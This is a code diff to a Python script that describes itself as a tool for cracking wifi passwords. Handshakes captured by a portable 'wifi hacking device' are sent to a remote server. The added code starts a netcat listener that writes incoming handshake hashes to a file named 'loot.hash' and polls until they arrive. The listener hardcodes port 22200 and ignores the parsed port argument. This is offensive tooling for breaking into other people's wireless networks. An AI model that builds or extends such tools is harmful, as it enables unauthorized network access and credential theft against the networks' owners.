@@ -36,7 +36,10 @@
 # the WHD should store/display the wifi network and password
 
 import argparse
+import subprocess
+import time
 from termcolor import colored
+
 # Set up the argument parser
 parser = argparse.ArgumentParser(description='A tool to crack wifi passwords using a mobile wifihacking device and a remote server to crack the handshakes.')
 
@@ -44,5 +47,25 @@ parser.add_argument('-w', '--wordlist', metavar=colored('wordlist', 'green'), ac
 parser.add_argument('-p', '--port', metavar=colored('port', 'green'), action="store", required=True, help='The port you want to listen on for the handshake; must be the same as the port setup on the wifi-hacking device')
 parser.add_argument('-d', '--device', metavar=colored('device', 'green'), action="store", required=True, help='The ip/hostname of the device you want to send the wifi SSID and password to, usually the WHD, can be something else, if it\'s listening')
 
+port = parser.parse_args().port
 
 print(colored("test","yellow"))
+
+print(f"Starting process to read hashes sent to port {port}...")
+
+nc_listener = subprocess.Popen(['nc -lvp 22200 > loot.hash'], shell=True, stdout=subprocess.DEVNULL)
+
+print("Waiting for hashes...")
+
+
+# Loop to wait until we get the hashes on the specified port
+# you can test this by running "echo test | nc {HCS-ip} {HCS-port}
+while True:
+	hashes = open("loot.hash", "rt")
+	loot = hashes.read()
+	if loot != '':
+		print(f"loot.hash contains {loot}")
+		break
+	else:
+		time.sleep(5)
+
